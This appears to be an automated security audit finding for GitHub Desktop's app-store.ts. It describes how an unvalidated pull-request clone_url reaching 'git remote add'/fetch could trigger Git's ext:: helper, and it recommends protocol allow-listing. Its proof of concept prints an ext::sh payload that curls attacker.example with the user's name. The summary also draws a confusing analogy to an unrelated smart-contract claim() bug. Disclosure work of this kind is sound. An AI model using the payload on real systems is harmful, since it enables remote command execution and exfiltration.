### Title
Unvalidated PR head-repository `clone_url` passed to `git remote add`/fetch enables remote-helper command execution - (File: `app/src/lib/stores/app-store.ts`)

### Summary
The audited `claim()` bug is fundamentally about a privileged operation (`claim`) being executed on attacker/partner-supplied parameters (`policyIndex_`, `amount_`) without validating them against the recorded state (`coverageMap`/`coveredMap`) first. The Desktop analog is `AppStore._findPullRequestBranch`, which takes a `headCloneUrl` value that ultimately originates from a GitHub API object (`pullRequest.head.repo.clone_url`) and feeds it directly into `git remote add` / `git fetch` without validating that the URL uses an allow-listed transport (`https://` or `ssh://`). Just as the audited contract never re-validates `amount_`/`policyIndex_` before paying out, Desktop never re-validates the URL's scheme before handing it to Git, which supports the `ext::` remote helper capable of spawning arbitrary shell commands.

### Finding Description
`AppStore._findPullRequestBranch` resolves the remote to use for a pull request head repository: [1](#0-0) 

`headCloneUrl` is not validated for protocol/shape; it is passed straight into `addRemote`: [2](#0-1) 

which executes `git(['remote', 'add', name, url], ...)` with no `-c protocol.*.allow=` restriction and no `GIT_ALLOW_PROTOCOL` environment guard (unlike the submodule path, which explicitly gates `protocol.file.allow` behind `allowFileProtocol`, see `app/src/lib/git/submodule.ts` lines 45-46). Immediately after, the code fetches from that same remote: [3](#0-2) 

Git supports the `ext::<command>` remote-helper transport, which spawns an arbitrary shell command whenever the remote is contacted (`git fetch`, `ls-remote`, etc.). Because Desktop's `git remote add`/`fetch` calls here carry no protocol allow-list (no `-c protocol.ext.allow=never`, no `GIT_ALLOW_PROTOCOL=https:ssh:git` in `envForRemoteOperation`), a `clone_url` value of the form `ext::sh -c "..."` would be accepted by `addRemote` and executed on the next `_fetchRemote` call.

The path this reaches through is: `dispatcher.ts` → `openPullRequestFromUrl` (deep-link "Open PR in Desktop" flow, which is a user-clicked-link entry point) → `AppStore._checkoutPullRequest` → `_findPullRequestBranch` → `addRemote`/`fetch`. [4](#0-3) 

### Impact Explanation
If the `clone_url` value reaching `addRemote`/`fetch` can be attacker-influenced (e.g. a malicious/compromised GitHub Enterprise server the user has authenticated to, which is one of the explicitly valid attacker primitives — "a GitHub API object" whose value drives a git operation), this results in local command execution on the victim's machine outside any git-object sandbox, i.e. full code execution triggered purely by opening a deep link / PR-in-Desktop action. This is materially worse than the audited `claim` bug (fund misdirection) because it breaks host integrity, not just contract state.

### Likelihood Explanation
Exploitability against api.github.com specifically is low because `clone_url` is server-formatted there. However, Desktop supports arbitrary GitHub Enterprise endpoints (`app/src/ui/lib/enterprise-validate-url.ts` only restricts the *enterprise host* URL to `https:`, it does nothing to constrain repository `clone_url` fields returned by that server's API), and no code path in `app-store.ts`/`remote.ts` re-validates the transport scheme of API-sourced clone URLs before they reach `git remote add`/`fetch`. Given the amount of hardening already present elsewhere in this codebase (clone path sensitivity checks in `app/src/lib/git/clone.ts`, `sanitizeCloneName`, `resolveWithin` symlink-safe resolution, strict `urlMatchesRemote` identifier comparisons, and the explicit `allowFileProtocol` gate for submodules), the *absence* of an equivalent protocol allow-list specifically on the PR-fork-remote path stands out as the one unguarded route I could confirm from the available code.

I was not able to fully audit `app/src/lib/git/environment.ts`/`core.ts` beyond the snippets retrieved, so I cannot rule out a global `GIT_ALLOW_PROTOCOL` set elsewhere in the process environment that would neutralize this; this should be verified directly in the repository before treating this as confirmed-exploitable.

### Recommendation
Before calling `addRemote`/`fetch` with any URL sourced from a GitHub API object (`head.repo.clone_url`, `base.repo.clone_url`), validate that the URL parses as `https:` or `ssh:`/`git@` (reusing `parseRepositoryIdentifier`/`parseRemote` from `app/src/lib/remote-parsing.ts`, which already rejects unrecognized shapes) and reject anything else. Additionally, set `GIT_ALLOW_PROTOCOL=http:https:ssh:git` (or the dugite/git equivalent `-c protocol.allow=never -c protocol.https.allow=always -c protocol.ssh.allow=always`) in `envForRemoteOperation` for all remote-triggering git invocations, mirroring the existing `allowFileProtocol`/`protocol.file.allow` gate used for submodules.

### Proof of Concept
1. Point Desktop at a GitHub Enterprise (or compromised/MITM) API endpoint the user has authenticated to.
2. Have that server return a pull request object whose `head.repo.clone_url` is `ext::sh -c "curl attacker.example/$(whoami) > /tmp/x"` (or similar OS command).
3. User clicks an "Open in GitHub Desktop" deep link (or the PR list in-app) for that PR.
4. `openPullRequestFromUrl` → `_checkoutPullRequest` → `_findPullRequestBranch` runs `addRemote(repository, forkRemoteName, headCloneUrl)` then `_fetchRemote`, causing Git to invoke the `ext::` helper and execute the attacker's command with the privileges of the Desktop process.

(This PoC could not be executed against the live application in this environment; it is derived purely from the local source code paths cited above and should be validated by a Devin session with repository/runtime access.)
